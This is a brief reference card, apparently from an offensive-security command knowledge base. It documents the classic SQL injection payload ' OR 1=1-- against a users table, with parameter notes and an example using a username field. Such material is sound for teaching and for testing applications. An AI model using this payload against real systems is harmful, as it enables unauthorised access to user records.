---
data: SELECT * FROM users WHERE id='1' OR 1=1--
tags:
  - sqli
  - injection
type: command
output: All records from users table
executor: sql
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:15.049Z'
id: 339e0a13-1aa8-4eff-a13e-590e06806b4a
verified: false
validated: true
submitted: true
---
# injected-sql-example

## Command

```sql
SELECT * FROM users WHERE id='1' OR 1=1--
```

## Description

Example exploited query after id input '1' OR 1=1-- , bypassing WHERE to return all records.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| WHERE id | Injected condition | Yes |
| OR 1=1-- | Payload to true all rows | Yes |

## Examples

### Basic Usage

```sql
SELECT * FROM users WHERE username='noob' or 1=1--;
```

## Expected Output

All user rows returned.

## Related

- [[Related Procedure|procedures/Exploit-SQL-Injection-with-Malicious-Input]]
